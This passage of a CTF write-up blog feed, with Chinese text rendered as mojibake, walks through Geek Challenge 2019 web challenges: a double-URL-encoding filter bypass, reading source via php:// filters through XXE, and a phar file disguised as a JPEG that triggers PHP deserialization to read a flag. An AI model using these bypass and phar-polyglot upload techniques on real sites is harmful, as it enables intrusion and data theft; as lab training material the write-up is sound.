class="line">var_dump(urlencode($str));<span class="comment">//syclover%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%B8%00%00%00%00%00%00%00nb</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†Heartçš„å€¼ä¿®æ”¹æˆ<code>2399f812e1a15732dcaadef365b71c19</code> æäº¤lover</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191106164815760.png" alt="image-20191106164815760"></p><p>åé¢çœ‹äº†LiMçš„æ–‡ç« ï¼Œæ¯äº†ã€‚</p><p>åŒURLç¼–ç ç»•è¿‡ï¼Œç›´æ¥POSTæäº¤  <code>lover=syclove%2572</code> å¾—åˆ°flagã€‚</p><p>æ€è·¯å¤ªå±€é™äº†ã€‚ã€‚ã€‚</p><p><a href="https://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p><p><a href="https://www.freebuf.com/articles/database/164019.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p><h2 id="Finalsql"><a href="#Finalsql" class="headerlink" title="Finalsql"></a>Finalsql</h2><h2 id="ä½ è¯»æ‡‚æ½‡æ–‡æ¸…çš„ç½‘ç«™äº†å—-xxe"><a href="#ä½ è¯»æ‡‚æ½‡æ–‡æ¸…çš„ç½‘ç«™äº†å—-xxe" class="headerlink" title="ä½ è¯»æ‡‚æ½‡æ–‡æ¸…çš„ç½‘ç«™äº†å— : xxe"></a>ä½ è¯»æ‡‚æ½‡æ–‡æ¸…çš„ç½‘ç«™äº†å— : xxe</h2><p>éƒ½å·²ç»æç¤ºxxeäº†</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191112171229906.png" alt="image-20191112171229906"></p><p>åˆ©ç”¨phpä¼ªåè®®è¯»å–æºç </p><p>index.phpä¸­çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./config.php"</span>);</span><br><span class="line">date_default_timezone_set(<span class="string">"PRC"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $data= $_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/flag|decode|file|zlib|input|data|http|ftp|#/i"</span>,$data))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"no!!!you cant read flag right here!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $xml = simplexml_load_string($data,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>($xml);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°åŒ…å«äº†configæ–‡ä»¶</p><p>æ¥ç€è¯»</p><p>config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $filetype;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"wake up "</span>;</span><br><span class="line">        var_dump(readfile(<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($filetype,$filename)</span></span>&#123;</span><br><span class="line">    $filename = $filename;</span><br><span class="line">    $filetype = $filetype;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (($filetype!=<span class="string">"image/jpg"</span>)&amp;&amp;(substr($filename, strrpos($filename, <span class="string">'.'</span>)+<span class="number">1</span>))!= <span class="string">'jpg'</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"åªå…è®¸ä¸Šä¼ jpgæ ¼å¼æ–‡ä»¶"</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($filetemp)</span></span>&#123;</span><br><span class="line">    $target_file=getcwd().<span class="string">"/uploads/"</span>.md5($filetemp+$_SERVER[<span class="string">'HTTP_REFERER'</span>]).<span class="string">".jpg"</span>;</span><br><span class="line">    $handle = fopen($filetemp, <span class="string">"r"</span>);</span><br><span class="line">    $content = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">while</span>(!feof($handle))&#123;</span><br><span class="line">        $content .= fread($handle, <span class="number">8080</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/xml|#|SYSTEM|DOCTYPE|fliter|uploads|www/i"</span>,$content))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Invalid file!!!!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">    fclose($handle);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($filetemp, $target_file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"your file is here:"</span>.$target_file;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†index.phpå¹¶æ²¡æœ‰æŠŠFileç±»å®ä¾‹åŒ–ã€‚Fileç±»ä¸­æœ‰ä¸Šä¼ åŠŸèƒ½çš„å‡½æ•°ï¼Œå°±çŒœäº†ä¸‹upload.php ã€‚è¿˜çœŸæœ‰ã€‚ã€‚ã€‚</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191112234259635.png" alt="image-20191112234259635"></p><p>è¯»å–upload.phpçš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"></span><br><span class="line">$filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">$filetype = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">$filetemp = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line"></span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$file-&gt;check($filetype,$filename);</span><br><span class="line">$file-&gt;upload($filetemp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¹¶æ²¡æœ‰ <code>unserialize()</code>å‡½æ•°ï¼Œä½†æ ¹æ®æºç ï¼Œè¦è§¦å‘ <code>__wakeup()</code>å‡½æ•°æ‰èƒ½å¾—åˆ°flag</p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨<code>phar://</code>åè®®ï¼Œè§¦å‘ååºåˆ—</p><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="comment">//ç”Ÿæˆå¯¹åº”å¯è¢«åˆ©ç”¨çš„å¯¹è±¡</span></span><br><span class="line">    $o = <span class="keyword">new</span> File();</span><br><span class="line">    @unlink(<span class="string">"phar.jpg"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.jpg"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"JFIF"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ jpgæ–‡ä»¶å¤´ç”¨ä»¥æ¬ºéª—æ£€æµ‹</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶  text.txtå†…å®¹éšæ„</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†æ–‡ä»¶ä¸Šä¼ </p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191114132547110.png" alt="image-20191114132547110"></p><p>åˆ©ç”¨<code>phar://</code>åè®®è§¦å‘åºåˆ—åŒ–</p><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Write-up/image-20191114132652219.png" alt="image-20191114132652219"></p><p>è§£ç å¾—åˆ°flag</p><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p><p><a href="https://xz.aliyun.com/t/3336" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p>]]></content>
    
    <summary type="html">
    
      é¢˜ç›®å¾ˆæœ‰æ„æ€.æ¯”èµ›åœ°å€:http://geek.sycsec.com:44444/challenge/index
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="WP" scheme="https://0xcreed.jxustctf.top/tags/WP/"/>
    
      <category term="PHP" scheme="https://0xcreed.jxustctf.top/tags/PHP/"/>
    
  </entry>
  
</feed>
